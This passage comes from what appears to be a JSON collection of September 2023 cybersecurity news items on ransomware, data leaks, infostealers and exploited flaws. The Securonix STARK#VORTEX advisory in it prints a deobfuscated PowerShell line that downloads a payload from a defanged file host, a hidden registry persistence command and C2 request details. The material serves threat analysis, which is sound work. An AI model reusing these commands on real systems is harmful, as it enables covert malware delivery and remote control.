a link feature. By carefully crafting the parameters, an attacker could exploit this vulnerability to take control of a user’s account.“For the first vulnerability, the vendor decided to check if the SQL query to update the member information via the code parameter is valid. This code value could only be obtained by users that already completed their payment or process on a paid membership level,” Patchstack wrote. “For the second vulnerability, the vendor decided to match the login parameter used for the reset password key check and the actual user object on the $user_data variable.”The vendor released version 4.3.5 on August 30 2023 to patch these issues, implementing checks to validate user-controlled parameters in custom registration and password reset processes."
   },
   {
      "time": "2023-09-28",
      "title": "Fake Bitwarden sites push new ZenRAT password-stealing malware",
      "text": " Fake Bitwarden sites are pushing installers purportedly for the open-source password manager that carry a new password-stealing malware that security researchers call ZenRAT.The malware is distributed to Windows users through websites that imitate the legitimate Bitwarden site and rely on typosquatting to fool potential victims.The purpose of ZenRAT is to collect browser data and credentials along with details about the infected host, a behavior consistent with an information stealer.Cybercriminals can use the details to create a fingerprint of the compromised system that can be used to access an account as if the legitimate user logged in.Security researchers at cybersecurity company Proofpoint discovered ZenRAT after receiving in August a sample of the malware from Jérôme Segura, Senior Director of Threat Intelligence at Malwarebytes.The distribution point was “a very convincing lookalike to the real bitwarden.com” with a domain name specifically selected to trick visitors into believing they were accessing the official resource - bitwariden[.]com.Inside the fake Bitwarden installation package, Proofpoint researchers found a malicious .NET executable that is a remote access trojan (RAT) with info-stealing features they are now tracking as ZenRAT.The malicious Bitwarden installer for Windows is delivered from crazygameis[.]com, another fake URL for the legitimate browser-based gaming platform CrazyGames.Once running, ZenRAT uses WMI queries and other system tools to collect data about the host, which includes:The details above are delivered to the command and control (C2) server in a ZIP archive that also includes data and credentials collected from the web browser.Before communicating with the C2, though, ZenRAT makes sure that the host is not in a restricted region (Belarus, Kyrgyzstan, Kazakhstan, Moldova, Russia, and Ukraine).The malware also checks if it is running in a virtual machine or a sandbox, a sign that researchers are analyzing it.However, the researchers also discovered some strange information in the installer’s metadata, such as claiming to be the hardware info app Speccy, from Piriform.Another peculiarity is data about the signer of the installer. Although the digital certificate is not valid, ZenRAT’s installer lists Tim Kosse, the developer of the open-source FileZilla FTP software, as the signer.Despite having functions specific to an information stealer, Proofpoint has found evidence suggesting that the malware is designed to be modular and its capabilities can be expanded; however, no other modules have been observed in the wild.The Bitwarden password manager has increased in popularity lately as it is regarded as a better alternative to other products on the market. With a growing user base, the software and its users become a target as cybercriminals take advantage "
   },
   {
      "time": "2023-09-28",
      "title": "DarkBeam leaks billions of email and password combinations",
      "text": " The leaked logins present cybercriminals with almost limitless attack capabilities.DarkBeam, a digital risk protection firm, left an Elasticsearch and Kibana interface unprotected, exposing records with user emails and passwords from previously reported and non-reported data breaches.According to CEO of SecurityDiscovery Bob Diachenko, who first identified the leak, the now-closed instance contained over 3.8 billion records.DarkBeam has apparently been collecting information to alert its customers in case of a data breach. The incident will most likely affect more than DarkBeam users alone.The data leak, first identified on September 18th, was closed instantly after Diachenko informed the company about the issue.Diachenko claims that such data leaks usually happen due to human error, for example when employees forget to password-protect the instance after maintenance.Cybernews contacted DarkBeam for comment but received no reply at the time of writing.Among the leaked data, there were 16 collections named “email 0-9” and “email A-F,” each containing 239,635,000 records.Exposing the collections of login pairs – emails and passwords – is dangerous as it provides malicious actors with almost limitless attack capabilities.While the majority of the leaked data comes from already known sources, the extensive and organized compilation of this data presents a significant threat to individuals whose credentials have been disclosed.Threat actors might target affected users with crafted phishing campaigns using their personal information. Phishing messages often impersonate trusted people or organizations to trick victims into giving up sensitive data.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-09-28",
      "title": "Building automation giant Johnson Controls hit by ransomware attack",
      "text": " Johnson Controls International has suffered what is described as a massive ransomware attack that encrypted many of the company devices, including VMware ESXi servers, impacting the company’s and its subsidiaries’ operations.Johnson Controls is a multinational conglomerate that develops and manufactures industrial control systems, security equipment, air conditioners, and fire safety equipment.The company employs 100,000 people through its corporate operations and subsidiaries, including York, Tyco, Luxaire, Coleman, Ruskin, Grinnel, and Simplex.Yesterday, a source told BleepingComputer that Johnson Controls suffered a ransomware attack after initially being breached at its Asia offices.BleepingComputer has since learned that the company suffered a cyberattack over the weekend that caused the company to shut down portions of its IT systems.Since then, many of its subsidiaries, including York, Simplex, and Ruskin, have begun to display technical outage messages on website login pages and customer portals.\"We are currently experiencing IT outages that may limit some customer applications such as the Simplex Customer Portal,\" reads a message on the Simplex website.\"We are actively mitigating any potential impacts to our services and will remain in communication with customers as these outages are resolved.\" If you have any information on this attack or other attacks, you can contact us confidentially via Signal at 646-961-3731Customers of York, another Johnson Controls subsidiary, report that they are being told the company’s systems are down, with some stating they were told it was due to a cyberattack.\"I talked to our rep and he said someone hacked them,\" posted another customer.BleepingComputer has been told that the ransom note links to a negotiation chat where the ransomware gang demands $51 million to provide a decryptor and to delete stolen data.The threat actors also claim to have stolen over 27 TB of corporate data and encrypted the company's VMWare ESXi virtual machines during the attack.BleepingComputer has contacted Johnson Controls with questions regarding the attack but has not received a response.After publication of our story, Johnson Controls confirmed the cybersecurity incident in a Form 8-K filing with the SEC, stating that they are working with external cybersecurity experts to investigate the incident and coordinating with insurers.\"Johnson Controls International plc (the “Company”) has experienced disruptions in portions of its internal information technology infrastructure and applications resulting from a cybersecurity incident. Promptly after detecting the issue, the Company began an investigation with assistance from leading external cybersecurity experts and is also coordinating with its insurers. The Company continues to assess what information was impacted and is executing its incident management and protection plan, including implementing remediation measures to mitigate the impact of the incident, and will continue taking additional steps as appropriate. To date, many of the Company’s applications are largely unaffected and remain operational. To the extent possible, and in line with its business continuity plans, the Company implemented workarounds for certain operations to mitigate disruptions and continue servicing its customers. However, the incident has caused, and is expected to continue to cause, disruption to parts of the Company’s business operations. The Company is assessing whether the incident will impact its ability to timely release its fourth quarter and full fiscal year results, as well as the impact to its financial results.\nThe Company’s investigation and remediation efforts are ongoing.\"Dark Angels is a ransomware operation launched in May 2022 when it began targeting organizations worldwide.Like almost all human-operated ransomware gangs, Dark Angels breaches corporate networks and then spreads laterally through the network. During this time, the threat actors steal data from file servers to be used in double-extortion attacks.When they gain access to the Windows domain controller, the threat actors deploy the ransomware to encrypt all devices on the network.Dark Angels launched a data leak site in April 2023 called 'Dunghill Leaks' that is used to extort its victims, threatening to leak data if a ransom is not paid.Update 9/27/23: Added statement from Form 8-K filing."
   },
   {
      "time": "2023-09-28",
      "title": "Researchers Release Details of New RCE Exploit Chain for SharePoint",
      "text": " Researchers who discovered two critical vulnerabilities in Microsoft SharePoint Server have released details of an exploit they developed that chains the two vulnerabilities together to enable remote code execution on affected servers.Separately, another security researcher this week posted proof-of-concept code on GitHub for one of the SharePoint vulnerabilities that shows how an attacker could exploit the flaw to gain admin privileges on vulnerable systems.Researchers from Singapore-based StarLabs who reported both flaws to Microsoft this week released details of an exploit chain they had developed that allowed them to use the vulnerabilities to gain pre-authentication RCE on affected systems. They first demonstrated the exploit at Pwn2own Vancouver in March.In comments to Dark Reading, Lobstein says his PoC is different from the one that the researchers from StarLabs described in their technical paper this week. He points to another PoC that researchers from Vietnamese security firm VNPT Information Technology Company released August 31 that also showed how an attacker could use the \"None\" algorithm to spoof JWT tokens and elevate privileges.\"When [an attacker is] operating under administrative privileges, several critical outcomes are conceivable,\" Lobstein says. A malicious admin could delete organizational data or corrupt it in multiple ways, they could access and exfiltrate sensitive data, or alter user and group permissions to cause widespread disruptions in SharePoint environments, he says.\"For organizations running SharePoint Server, especially version 2019, immediate action is vital,\" SOCRadar said in a blog. \"With the exploit now publicly accessible, the likelihood of malicious entities leveraging it has substantially increased.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-09-28",
      "title": "Modern GPUs vulnerable to new GPU.zip side-channel attack",
      "text": " Researchers from four American universities have developed a new GPU side-channel attack that leverages data compression to leak sensitive visual data from modern graphics cards when visiting web pages.The researchers disclosed the vulnerability to impacted video card manufacturers in March 2023. However, as of September 2023, no affected GPU vendors (AMD, Apple, Arm, NVIDIA, Qualcomm) or Google (Chrome) have rolled out patches to address the problem.Generally, data compression creates distinct data-dependent DRAM traffic and cache utilization, which can be abused for leaking secrets, so software turns off compression when handling sensitive data.The GPU.zip researchers explain that all modern graphic processor units, especially integrated Intel and AMD chips, perform software-visible data compression even when not explicitly asked.Modern GPUs follow this risky practice as an optimization strategy, as it helps save on memory bandwidth and improve performance without software.This compression is often undocumented and vendor-specific, and the researchers have found a way to exploit it to leak visual data from GPUs.Specifically, they demonstrated an attack that extracts individual pixel data through a web browser on various devices and GPU architectures, as shown below.The proof-of-concept attack demonstrates stealing the username from a Wikipedia iframe, which is possible within 30 minutes on Ryzen and 215 minutes on Intel GPUs, at accuracies of 97% and 98.3%, respectively.The iframe hosts a cross-origin webpage whose pixels are isolated and turned into binary, meaning they're converted into two possible colors.Next, these pixels are enlarged, and a specialized SVG filter stack is applied to create textures that are either compressible or not. By measuring the time taken for the texture to render, the researchers can deduce the original color/state of the target pixel.While Hot Pixels exploits data-dependent computation times on modern processors, GPU.zip hinges on undocumented GPU data compression to achieve similar results.GPU.zip impacts almost all major GPU manufacturers, including AMD, Apple, Arm, Intel, Qualcomm, and NVIDIA, but not all cards are equally affected.The fact that none of the impacted vendors have decided to fix the issue by optimizing their data compression approach and limiting its operation to non-sensitive cases further raises the risk.Although GPU.zip potentially impacts the vast majority of laptops, smartphones, tablets, and desktop PCs worldwide, the immediate impact on users is moderated by the complexity and time required to perform the attack.Also, websites that deny cross-origin iframe embedding cannot be used for leaking user data through this or similar side-channel attacks.\"Most sensitive websites already deny being embedded by cross-origin websites. As a result, they are not vulnerable to the pixel stealing attack we mounted using GPU.zip,\" explains the researchers in a FAQ on the team's website.Finally, the researchers note that Firefox and Safari do not meet all the criteria needed for GPU.zip to work, such as allowing cross-origin iframes to be loaded with cookies, rendering SVG filters on iframes, and delegating rendering tasks to the GPU.Update 9/28 - An Intel spokesperson has sent BleepingComputer the following comment regarding the GPU.zip risk and its impact on the firm's products:While Intel hasn't had access to the researcher’s full paper, we assessed the researcher findings that were provided and determined the root cause is not in our GPUs but in third party software."
   },
   {
      "time": "2023-09-28",
      "title": "    Unraveling the Layers: Analysis of Kimsuky's Multi-Staged Cyberattack | ThreatMon\n",
      "text": " Stay informed about emerging risks and potential security breaches on the\n                                                deep/dark web.Learn about mitigation methods for security problems.Track and manage your organization's online reputation to maintain a\n                                                positive image.Read the latest blog post about the threat intelligence world.Stay updated with ThreatMon’s reports prepared by an expert cyber\n                                                security analyst team.Stay updated with ThreatMon’s vulnerabilities prepared by an expert cyber\n                                                security analyst team.Stay updated with ThreatMon’s help center prepared by an expert cyber\n                                                security analyst team.Learn more About ThreatMon.Check out our Terms of Use.Review our Privacy Policy.Introduction In recent developments within the realm of cybersecurity, an alarming revelation has come to light—an intricate and multi-staged attack campaign executed by the Kimsuky Advanced Persistent Threat (APT) group. This campaign is marked by its exceptional sophistication, designed to penetrate target systems with the utmost precision while eluding detection. In this report, we embark on an in-depth exploration of the technical intricacies and strategic maneuvers that underpin Kimsuky APT's malicious objectives. By dissecting each stage of this campaign, we aim to provide a comprehensive understanding of the threat actor's methods and the potential risks they pose to cybersecurity.Key findings include: ThreatMon has a team of highly\n                    Threatmon's cutting-edge solution combines Threat Intelligence, External Attack Surface Management,\n                    and\n                    Digital Risk Protection to identify vulnerabilities and provide personalized security solutions for\n                    maximum security. ThreatMon identifies the distinctive nature of each business and provides bespoke\n                    solutions that cater to its specific needs.\n                \n                    The 30-day free trial of ThreatMon allows users to explore the product's security benefits. During this trial period, you can test Threat Intelligence data, detect threats to your organization and recommend security measures.\n                "
   },
   {
      "time": "2023-09-28",
      "title": "Threat Labs Security Advisory: New STARK#VORTEX Attack Campaign: Threat Actors Use Drone Manual Lures to Deliver MerlinAgent Payloads - Securonix",
      "text": " By Securonix Threat Research: D.Iuzvyk, T.Peck, O.KolesnikovSept. 25, 2023, updated Sept. 27, 2023, updated Oct. 6, 2023As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down. New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.Our team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military. Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware. Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection. We’ll go over each stage in detail further down.The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine. Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007. They can, however, be opened and executed in modern Windows versions.Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chmAs we mentioned previously, the lure document was themed as a drone or UAV manual. Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chmSince Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip. With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chmAfter examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags. Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.Figure 4: Example of obfuscated JavaScript code found within page1.htmlFigure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chmAfter deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code. This time some key information such as C2 URL and payload names become visible. This is seen in the figure below.Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chmWith the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing. In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.Figure 7: Deobfuscated PowerShell analysis — file download, directory setupThis first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize). The bulk of the code is stored inside the doS function which is called at the end of the script.Next the script performs key functions:The script then downloads the file from the C2 server. The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command:[System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”)The command is then executed using an invoke expression (IEX).Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below:Figure 8: Deobfuscated PowerShell — binary file decodingIn a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.Compute the hash and fill the XOR mask File transformation using the XOR mask:Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective. It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.Figure 9: Stage 3, deobfuscated PowerShellThe last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file. The last portion of the script then executes the original file in a few different ways.The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier. Also the existence of optional binary file arguments which were set to “null” in this case.The Windows binary file downloaded is a 64-bit executable at about 5MB in size. Some additional binary information is highlighted in figure 10 below.Figure 10: ctlhost.exe — binary file overviewUpon closer examination, it appears to be a generated binary executable by the MerlinAgent framework. Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.The MerlinAgent framework is an open source C2 framework written in Go. It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads. Attackers can then distribute these payloads and incorporate them into their own malware stager or loader. MerlinAgent has a wide range of capabilities which include:The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for:Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com. It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”. This will execute the binary file every time the user logs into the system.Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file. Typically receiving a Microsoft help file over the internet would be considered unusual. However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .During the STARK#VORTEX campaign we observed the following network communication to C2 hosts. Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443. Request related details will be provided in Appendix A below.Always be extra cautious downloading file attachments from posts for private messages. When it comes to prevention and detection, the Securonix Threat Research Team recommends:References:“request”: {   “HOST”: “listen.servemp3[.]com”,   “ACCEPT-ENCODING”: “gzip”,   “server_conn“: “168.100.8 [.]245”,   “AUTHORIZATION”: “Bearer eyJhbGc[REDACTED]UFQ”,   “CONTENT-LENGTH”: “1826”,   “CONTENT-TYPE”: “application/octet-stream; charset=utf-8”,   “USER-AGENT”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36”},“request_hex”: “fe 02 26 0c 00 fe 02 21[REDACTED]48 34 77 33 58 77 “,“body_hex”: “fe 0c 40 0c 00 fe 0c 3b[REDACTED]74 4b 61 55 6b 65 69 78 56 78”,“method”: “POST”,  }, The lure document has also been retargeted. As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign. Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload. The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”. When opened, the content of the lure file simply contains a few company logos.Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner. Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chmThe PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod. The encoded payload is decoded and then executed in almost the same fashion as we saw before. The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net. Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game. This does speculate that it was probably not intended for business systems where games would normally not be found. Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week. The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis. Updated IoCs and Seeder hunting queries can be found below.\nSome examples of relevant Securonix provisional detectionsRelevant hunting/Spotter queries (be sure to remove square brackets “[ ]”)Securonix 2022. All Rights Reserved"
   },
   {
      "time": "2023-09-27",
      "title": "\r\n\tTech Giants Launch Post-Quantum Cryptography Coalition - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineA new tech consortium launched today with a mission to drive adoption of post-quantum cryptography (PQC).The PQC Coalition features Microsoft, IBM Quantum, MITRE, PQShield, SandboxAQ and the University of Waterloo among its founding members. The goal will be to improve uptake of PQC in commercial and open source technologies.Quantum computing represents an existential threat to Shor’s algorithm – the bedrock on which all asymmetric encryption is built.Although functioning quantum computers are still years away, experts have been warning that national and economic security could be imperilled if they find their way into the wrong hands.PQC Coalition members said they will look to work alongside NIST and the National Cybersecurity Center of Excellence (NCCoE) PQC Migration Project, to provide technology and guidance for the community.It will initially run four workstreams to:“Government and industry need to move together with urgency so that sensitive data and communications is not vulnerable to exposure in the future.”"
   },
   {
      "time": "2023-09-27",
      "title": "\r\n\tXenomorph Malware Resurfaces: 30+ US Banks Targeted - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistXenomorph malware has reemerged in a new distribution campaign, expanding its scope to target over 30 US banks along with various financial institutions worldwide. Cybersecurity analysts from ThreatFabric recently uncovered this resurgence, which relies on deceptive phishing webpages posing as a Chrome update to trick victims into downloading malicious APKs.Xenomorph first came to the attention of experts in February 2022. This malware is known for using overlays to capture personally identifiable information (PII) such as usernames and passwords. Notably, it features a sophisticated automated transfer system (ATS) engine, enabling a wide range of actions and modules, enhancing its adaptability.The latest campaign has seen a geographical expansion, with thousands of Xenomorph downloads recorded in Spain and the United States, reflecting a broader trend among malware families to target new markets across the Atlantic.In technical terms, Xenomorph has added new capabilities to its arsenal, including an anti-sleep feature, a “mimic” mode to avoid detection and the ability to simulate touch actions. The malware’s targets include Spain, Portugal, Italy, Canada, Belgium, numerous US financial institutions and cryptocurrency wallets.Another noteworthy development is the observation of Xenomorph being distributed alongside powerful desktop stealers, raising questions about potential connections between threat actors behind these malware variants, or the possibility that Xenomorph is now being offered as a Malware-as-a-Service (MaaS) for use in conjunction with other malicious software families.According to an advisory published by ThreatFabric on Monday, this resurgence underscores the persistent efforts of cyber-criminals to maximize their profits.“Xenomorph, after months of hiatus, is back, and this time with distribution campaigns targeting some regions that have been historically of interest for this family,” reads the technical write-up.“Xenomorph maintains its status as an extremely dangerous Android Banking malware, featuring a very versatile and powerful ATS engine, with multiple modules already created, with the idea of supporting multiple manufacturer’s devices.”Editorial image credit: HI_Pictures / Shutterstock.com"
   },
   {
      "time": "2023-09-27",
      "title": "New AtlasCross hackers use American Red Cross as phishing lure",
      "text": " A new APT hacking group named 'AtlasCross' targets organizations with phishing lures impersonating the American Red Cross to deliver backdoor malware.Cybersecurity firm NSFocus identified two previously undocumented trojans, DangerAds and AtlasAgent, associated with attacks by the new APT group.NSFocus reports that the AtlasCross hackers are sophisticated and evasive, preventing the researchers from determining their origin.\"The technical level and cautious attitude shown by this attacker during this activity are also worthy of attention.\"AtlassCross attacks begin with a phishing message pretending to be from the American Red Cross, requesting the recipient to participate in a \"September 2023 Blood Drive.\"These emails contain a macro-enabled Word document (.docm) attachment that urges the victim to click \"Enable Content\" to view the hidden content.However, doing so will trigger malicious macros that infect the Windows device with the DangerAds and AtlasAgent malware.The macros first extracts a ZIP archive on the Windows device to drop a file named KB4495667.pkg, which is the DangerAds system profiler and malware loader. A scheduled task named \"Microsoft Office Updates\" is created to launch DangerAds daily for three days.DangerAds functions as a loader, assessing the host environment and running built-in shellcode if specific strings are found in the system's username or domain name, an example of AtlasCross's narrow targeting scope.Eventually, DangerAds loads x64.dll, which is the AtlasAgent trojan, the final payload delivered in the attack.AtlasAgent is a custom C++ trojan and its core functions include extracting host and process details, preventing the launch of multiple programs, executing additional shellcode on the compromised machine, and downloading files from the attacker's C2 servers.Upon first launch, the malware sends information to the attacker's servers, including local computer name, network adapter information, local IP address, network card info, OS system architecture and version, and a running process list.The attacker's servers will then respond with commands for AtlasAgent to execute, which can be done using new threads or within one of the existing processes, making it harder for security tools to detect and stop.Moreover, AtlasAgent supports the following commands:While NSFocus' report is the first detailing the new hacking group, AtlasCross remains a largely unknown threat that operates on unclear motives and obscure targeting scope.The threat actor's selective targeting, custom-made trojans, and malware loaders, combined with a preference for discreet infection methods over efficiency, have allowed them to operate undetected for an undefined duration."
   },
   {
      "time": "2023-09-27",
      "title": "Hackers actively exploiting Openfire flaw to encrypt servers",
      "text": " Hackers are actively exploiting a high-severity vulnerability in Openfire messaging servers to encrypt servers with ransomware and deploy cryptominers.Openfire is a widely used Java-based open-source chat (XMPP) server downloaded 9 million times and used extensively for secure, multi-platform chat communications.Using those accounts, the attackers install malicious Java plugins (JAR files) that execute commands received via GET and POST HTTP requests.This dangerous flaw impacts all Openfire versions from 3.10.0, dating to 2015, to up to 4.6.7 and from 4.7.0 to 4.7.4.Dr. Web now reports signs of active exploitation, as hackers have taken advantage of the attack surface for their malicious campaigns.The first case of active exploitation seen by Dr. Web dates to June 2023, when the security firm investigated a server ransomware attack that occurred after CVE-2023-32315 was exploited to breach the server.The attackers leveraged the flaw to create a new admin user on Openfire, logged in, and used it to install a malicious JAR plugin that can run arbitrary code.Some of the malicious JAVA plugins seen by Dr. Web and customers include helloworld-openfire-plugin-assembly.jar, product.jar, and bookmarks-openfire-plugin-assembly.jar.After setting up an Openfire honeypot to capture the malware, Dr. Web caught additional trojans that are used in attacks in the wild.The first of the additional payloads is a Go-based crypto-mining trojan known as Kinsing.Its operators exploit CVE-2023-32315 to create an admin account named \"OpenfireSupport,\" and then install a malicious plugin called \"plugin.jar\" that fetches the miner payload and installs it on the server.In another case, the attackers installed a C-based UPX-packed backdoor instead, following a similar infection chain.A third attack scenario observed by Dr. Web's analysts is where a malicious Openfire plugin was used to obtain information about the compromised server, specifically network connections, IP addresses, user data, and the system's kernel version.Dr. Web has observed a total of four distinct attack scenarios leveraging CVE-2023-32315, making the application of the available security updates exigent.Since 2022, a threat actor has been encrypting exposed web servers with ransomware that appends the .locked1 extension.BleepingComputer is aware of Openfire servers encrypted by this ransomware in June.It is unclear what ransomware is behind these attacks, but the ransom demands are generally small, ranging from .09 to .12 bitcoins ($2,300 to $3,500).The threat actor does not appear to solely target Openfire servers, but any vulnerable web server. Therefore, applying all security updates for your servers when they become available is crucial."
   },
   {
      "time": "2023-09-27",
      "title": "ShadowSyndicate hackers linked to multiple ransomware ops, 85 servers",
      "text": " Security researchers have identified infrastructure belonging to a threat actor now tracked as ShadowSyndicate, who likely deployed seven different ransomware families in attacks over the past year.Group-IB analysts working together with Bridewell and independent researcher Michael Koczwara attribute with various degrees of confidence ShadowSyndicate's use of the Quantum, Nokoyawa, BlackCat/ALPHV, Clop, Royal, Cactus, and Play ransomware in multiple breaches observed since July 2022.Based on their findings, researchers believe that the threat actor could be an initial access broker (IAB), although evidence suggests that ShadowSyndicate is an affiliate to multiple ransomware operations.The researchers base their conclusions on a distinct SSH fingerprint they discovered on 85 IP servers, most of them tagged as Cobalt Strike command and control machines.\"We have dubbed the threat actor that uses the SSH fingerprint 1ca4cbac895fc3bd12417b77fc6ed31d ShadowSyndicate (previous name Infra Storm)\" - Group-IBThe analysts first saw the fingerprint on July 16, 2022, and it was still in use in August 2023.The team of researchers relied on various tools for their investigation, which included discovery engines like Shodan and Censys, along with various OSINT techniques. This allowed them to discover an extensive ShadowSyndicate activity footprint.Looking at the ShadowSyndicate servers identified based on the SSH fingerprint, the researchers \"came across eight different Cobalt Strike watermarks [license keys].\"The eight Cobalt Strike servers communicated with Cactus, Royal, Quantum, Nokoyawa, Play, Clop, and BlackCat/ALPHV ransomware deployed on various victim networks.The researchers also discovered Cobalt Strike configurations deployed on two servers, but only one of them on a machine featuring the ShadowSyndicate SSH fingerprint.Other tools seen in ShadowSyndicate attacks include the IcedID malware loader, the Matanbuchus MaaS loader, and the Meterpreter Metasploit payload.The analysts tested the hypothesis that all 85 servers with the same SSH key fingerprint linked to ShadowSyndicate are connected to a single hosting provider but found 18 different owners, 22 distinct network names, and 13 different locations.Analysis of Cobalt Strike C2 parameters like detection date, watermarks, or sleep time settings helped produce high-confidence evidence that links ShadowSyndicate to Quantum, Nokoyawa, and ALPHV/BlackCat ransomware.Specifically, the analysts linked the servers to a Quantum attack from September 2022, three Nokoyawa attacks from Q4 2022 and April 2023, and an ALPHV attack from February 2023.Group-IB and the mentioned collaborating parties has found additional evidence that connects ShadowSyndicate with less confidence to Ryuk, Conti, Trickbot, Royal, Clop, and Play malware operations.For Clop particularly, Group-IB's report mentions that at least 12 IP addresses formerly linked to the notorious ransomware operators were transferred to ShadowSyndicate since August 2022 and are now utilized for Cobalt Strike.Despite the many findings that suggest a potential connection, a high-confidence direct link between ShadowSyndicate and Clop remains elusive.Group-IB's intelligence experts conclude that ShadowSyndicate is likely an affiliate working with various ransomware-as-a-service (RaaS) operations. However, additional evidence is needed to support this theory.Nevertheless, this work is crucial in identifying and combating cybercrime, and in this spirit, the cyberintelligence firm invites external researchers to openly collaborate with them and help uncover the remaining obscure parts."
   },
   {
      "time": "2023-09-27",
      "title": "Sony investigates cyberattack as hackers fight over who's responsible",
      "text": " Sony says that it is investigating allegations of a cyberattack this week as different hackers have stepped up to claim responsibility for the purported hack.While claims of attacking Sony's systems were initially made by an extortion group called RansomedVC, a different threat actor has touted themselves to be the attackers and refuted RansomedVC's claims.Thus far, over 3.14 GB of uncompressed data, allegedly belonging to Sony, has been dumped on hacker forums.This week, a threat actor by the name of RansomedVC claimed it had hacked SONY.com and put its \"data and access\" up for sale.\"We have successfully [compromised] all of Sony systems,\" read a note posted on RansomedVC's onion leak site. \"We wont ransom them! we will sell the data. due to Sony not wanting to pay.\"BleepingComputer observed the sample data posted by RansomedVC was minuscule, about 2 MB—comprising a PowerPoint presentation, some Java source code files, Eclipse IDE screenshots, and other assets.RansomedVC claimed to BleepingComputer that it had breached Sony's networks and stolen 260 GB of data during the attack that they are attempting to sell for $2.5 million.Contrary to its name, RansomedVC is an extortion group, rather than a ransomware operation, as they told us they are still developing an encryptor.We reached out to Sony Corporation for confirmation about the attack.\"We are currently investigating the situation, and we have no further comment at this time,\" a Sony Group Corporation spokesperson told BleepingComputer this morning.However, the matters have become murky, with 